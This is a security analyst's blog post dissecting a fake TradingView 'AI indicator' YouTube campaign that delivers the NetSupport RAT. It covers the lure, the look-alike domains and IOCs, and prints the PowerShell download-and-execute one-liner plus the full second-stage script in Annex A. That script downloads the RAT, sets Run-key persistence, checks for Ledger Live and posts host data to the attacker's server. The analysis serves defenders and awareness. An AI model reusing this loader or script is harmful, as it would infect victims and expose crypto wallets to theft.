---
author:
  name: Darkrym
date: 2025-07-02
linktitle: TradingView
type:
  - post
  - posts
title: "A Familiar Crypto Scam Returns — With a More Convincing Face"
weight: 10
series:
  - deep_dive
  - social_engineering
---
## TradingView Themed Phish Spreads NetSupport RAT 

A tried-and-tested crypto-themed cyber attack has popped up on my radar again today, a social engineering campaign masquerading as a legitimate **TradingView AI indicator**.

This isn’t new. In fact, 0x0vid did a great write-up on a similar campaign not too long ago:  [Another Day, Another Crypto Scam](https://medium.com/@0x0vid/another-day-another-crypto-scam-installing-a-rat-1f6dbbddeb43)

But this new variant takes things up a notch. The YouTube account pushing this malware was so polished, it initially fooled me, and a few SOC mates into thinking the **official TradingView YouTube channel had been compromised**.

---
## The Hook: Fake YouTube Video Promoting AI Crypto Predictions

The campaign hinges on a convincing YouTube video titled:

> _“The First AI That Predicts Crypto Moves”_

![Original Video](/pictures/crypto-phish/org_video.png)

The video which was pushed out by Google's own advertising, claims to showcase a new feature developed in collaboration with **TradingView** and **OpenAI**. It walks the viewer through how to activate this “AI indicator” using a command in the terminal after installing the TradingView desktop app.

Video walks you through the steps in the description:
```
Step-by-Step Guide: 
1. Install TradingView's desktop app on your computer: 🔗 https://www.tradingview.com/desktop/
2. Since the AI indicator is still in Beta, you need to enable beta mode in TradingView using Command Prompt. To open Command Prompt, press Win + R, type "cmd", and press Enter. 
3. Copy the beta mode update command from our repository (link below), then paste it into the command prompt window, and press Enter: 🔗 https://copycode[.]io/w3ux1X1V/
4. After the update is successful, you will receive a notification.
```

So far, this all looks legitimate. But the rabbit hole begins at:
- `copycode[.]io` – a very polished but hollow site that hosts only a PowerShell command.

The hosted command is deceptively simple:
```powershell
powershell -command "$tradingview='[.]app';$version='3.9.1_AI_Beta';$update='betamode'+$tradingview;$app=(Invoke-WebRequest $update -UseBasicParsing).Content;([Text.Encoding]::UTF8.GetString($app))|Invoke-Expression"
```

With a little bit of reverse engineering we can see it:
- Pulls content from `https://betamode[.]app`
- Pipes it straight into `Invoke-Expression` — meaning **code execution**

By defanging the command (removing `Invoke-Expression`), we can inspect the next stage. The script itself isn’t complex or heavily obfuscated. Here's a breakdown of its actions:

### 1. Infection Check
```powershell
if (Test-Path "$env:APPDATA\Nt\client32.ini") {
    Write-Host "Beta access temporarily paused due to high demand. Try again in 72 hours." -ForegroundColor Red
    exit
}
```
> A basic infection marker. If the system is already compromised, it exits and prints flavour text, presumably to avoid duplicate infections or raise suspicion with multiple popups.
### 2. Creates a Folder `C:\Users\{User}\AppData\Roaming\Nt`:
```powershell
$ntFolderPath = Join-Path $env:APPDATA "Nt"
New-Item -Path $ntFolderPath -ItemType Directory -Force
```
Standard folder creation, nothing sophisticated here. Typically pretty well hidden from the user, making it a common place for malware will drop its binaries.

### 3. Downloads Multiple Executables:

```powershell
$filesToDownload = @("client32.exe", "NSM.LIC", "remcmdstub.exe", ...)
Invoke-WebRequest -Uri "https://betamode.app/$file" ...
```
This is the payload, specifically the **NetSupport Manager client**, a legitimate remote access tool repurposed here as a Remote Access Trojan (RAT). Again, no stealth, no encryption just plain `Invoke-WebRequest`.


  ### 4. Sets Up Persistence with the name `NuClient`:

```powershell
Set-ItemProperty -Path "HKCU:\...Run" -Name "NuClient" -Value $exePath
```
Persistence is added via a `Run` key, basic but effective. The name “NuClient” doesn’t stand out much, but it’s still detectable to anyone checking startup items.

  ### 5. Scans for Ledger Live Installation:
```powershell
$ledgerPath = Join-Path $env:APPDATA "Ledger Live"
$ledgerExists = Test-Path $ledgerPath
```
This is the clearest sign of targeting. **Ledger Live** is a popular crypto wallet application, and the malware explicitly checks for it suggesting the actor is looking for stored seed phrases or private keys.

### 6. Phone Home (Well the TA Home)
```powershell
if ($ledgerExists) {
   $postData = "$computerName + Ledger Live"
} else {
   $postData = $computerName
}
```
The malware checks the environment, builds a profile of the machine (including whether a wallet is present), and prepares it for exploitation.

The data is then encrypted using AES with a **hardcoded key**:
`w7E9wVX3GE5fPymZn4+1Y4QoyaqzZ6zJtqCHXn0RAzM=`

Then sending this data to`https://betamode[.]app/info2.php` in a post request.

This is effectively a **“phone home”** signal, flagging the machine for manual RAT access depending on its crypto relevance.

### 7. **Closes with Deceptive Messaging**
```powershell
Write-Host "Beta access temporarily paused due to high demand. Try again in 72 hours." -ForegroundColor Red
```
Classic misdirection. This message closes the loop on the fake “AI beta feature” narrative while distracting the user from noticing anything suspicious has occurred.

---

## Why This  *Simple*  Campaign Almost Worked

Despite the fact that the actual malware was unsophisticated, the **delivery mechanism** was **exceptionally well-executed**. What made this campaign effective wasn't technical complexity it was **visual polish**, **clever use of branding**, and a level of attention to detail that most scams skip.

This post isn’t just to dissect another PowerShell RAT delivery, it's to underscore how **social engineering has matured**, and why we can't just rely on basic checks anymore. 

Here’s why this nearly fooled even seasoned analysts:
### **The YouTube Video Was Shockingly Professional**
At first glance, the video looked like a legitimate TradingView product launch:
- A well-dressed presenter delivered the walkthrough in a calm, confident tone.
- The pacing, editing, and subtitle formatting closely mimicked the real TradingView style.
- Branding elements like colour schemes, layout, and even the call-to-action mirrored TradingView’s media.

 I suspect the video was at least **partially AI-generated**. But it was so polished, it didn’t _feel_ like it. It came across as a **professional actor** walking users through a legitimate beta rollout not a scam.

Here’s a comparison between the legitimate TradingView YouTube page and the phishing channel that delivered the malware:

![Legit Channel](/pictures/crypto-phish/legit_youtube.png)

![Phish Channel](/pictures/crypto-phish/fake_youtube.png)

**Hard to tell, right?**  
Even with a trained eye, it’s easy to see how someone could be tricked. Especially when you realise that **all the videos on both pages are legitimate!!!!**

The phishing channel cleverly **embedded or mirrored real TradingView videos** to appear authentic. From what I can tell, the **only video actually uploaded by the attacker** is the one pushing the fake AI indicator. The rest just redirect or frame content from the real channel making it appear like part of the official video library.
### **The Domains Looked Legitimate and Thought-Out**
Two domains played key roles:
- `copycode[.]io` — The site hosting the PowerShell command
- `betamode[.]app` — The C2 for the RAT and malware staging

These weren’t sketchy domains ending in `.xyz`, `.top`, or `.cn`. They were:
- **Well-chosen** — sounding like modern SaaS tooling or developer portals
- **Visually convincing** — especially `copycode[.]io`, which had custom logos, icons, code syntax highlighting, and page layout resembling trusted developer platforms like GitHub Gist or Pastebin.

![Copy Code](/pictures/crypto-phish/copycode.jpeg)

`copycode[.]io` clearly had **serious work put into it** likely involving image generation to create branded assets and filler content. The site **didn’t raise red flags** until I tried to click on the links at the bottom of the page, and they didn't go anywhere. It wasn't trying to sell anything, just present itself as a clean code repository.

### **The Instructions Were Technical, But Approachable**
Another standout point: the process they described was **exactly the kind of arcane but plausible series of steps you'd expect** when enabling a hidden beta feature.

Steps like:
- Installing the TradingView desktop app
- Running a command in Terminal or Command Prompt
- Pulling from a trusted-looking `.io` code site

I suspect **none of this steps would raise red flags** for users who are **just technical enough to be trading crypto**, but **not trained in IT or cyber security**. These weren’t dumbed-down steps aimed at the average Facebook user. These were tailored to **crypto-savvy, semi-technical users**.

I’ll be honest even as an experienced cyber security analyst, after 10–20 minutes of analysis, I was still leaning toward “maybe TradingView really did get hacked.” That’s how convincing it was.

All of it added up to something that didn't just "look legitimate", but it felt _familiar_, and that’s what made it dangerous.

## IOC's

| Type           | Indicator                                                                       |
| -------------- | ------------------------------------------------------------------------------- |
| Domain         | `copycode[.]io`                                                                 |
| Domain         | `betamode[.]app`                                                                |
| C2 Domain      | `sonosarcs[.]com`                                                               |
| IP Address     | `185.203.241[.]195`                                                             |
| File   SHA256 | `client32.exe` 31804c48f9294c9fa7c165c89e487bfbebeda6daf3244ad30b93122bf933c79c |
| Registry Key   | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NuClient`                   |
### Annex A: (I have defanged the links, but its still malware so be warned)
```powershell
if (Test-Path "$env:APPDATA\Nt\client32.ini") {
    Write-Host "Beta access temporarily paused due to high demand. Try again in 72 hours." -ForegroundColor Red
    exit
}
$ntFolderPath = Join-Path $env:APPDATA "Nt"

if (!(Test-Path $ntFolderPath)) {
    New-Item -Path $ntFolderPath -ItemType Directory -Force | Out-Null
}

Set-Location $ntFolderPath

$filesToDownload = @(
    "AudioCapture.dll",
    "client32.exe",
    "client32.ini",
    "client32u.ini",
    "HTCTL32.DLL",
    "msvcr100.dll",
    "nskbfltr.inf",
    "NSM.ini",
    "NSM.LIC",
    "nsm_vpro.ini",
    "pcicapi.dll",
    "PCICHEK.DLL",
    "PCICL32.DLL",
    "remcmdstub.exe",
    "TCCTL32.DLL"
)

$headers = @{
}

foreach ($file in $filesToDownload) {
    $url = "https://bet"+"amode[.]app/$file"
    $output = Join-Path $ntFolderPath $file
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -Headers $headers -UseBasicParsing
    }
    catch {}
}

Set-Location "$env:AppData\Nt"

$exePath = "$env:APPDATA\Nt\client32.exe"

Start-Sleep -Seconds 2

if (Test-Path $exePath) {
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NuClient" -Value $exePath
        Start-Process $exePath
    } catch {}
}

$appDataPath = [Environment]::GetFolderPath('ApplicationData')

$ledgerPath = Join-Path $appDataPath "Ledger Live"
$ledgerExists = Test-Path $ledgerPath

$keyBase64 = 'w7E9wVX3GE5fPymZn4+1Y4QoyaqzZ6zJtqCHXn0RAzM='

function Encrypt-String {
    param (
        [string]$plainText,
        [string]$keyBase64
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key = [Convert]::FromBase64String($keyBase64)
    $aes.GenerateIV()
    $iv = $aes.IV

    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

    return [Convert]::ToBase64String($iv + $cipherBytes)
}

$appDataPath = [Environment]::GetFolderPath('ApplicationData')
$ledgerPath = Join-Path $appDataPath "Ledger Live"
$ledgerExists = Test-Path $ledgerPath

$computerName = $env:COMPUTERNAME

if ($ledgerExists) {
   $postData = "$computerName + Ledger Live"
} else {
   $postData = $computerName
}

$encryptedData = Encrypt-String -plainText $postData -keyBase64 $keyBase64

$url = "https://beta"+"mode[.]app/info2.php"
try {
    Invoke-RestMethod -Uri $url -Method Post -Body @{data = $encryptedData}
} catch {
}

Write-Host "Beta access temporarily paused due to high demand. Try again in 72 hours." -ForegroundColor Red
```
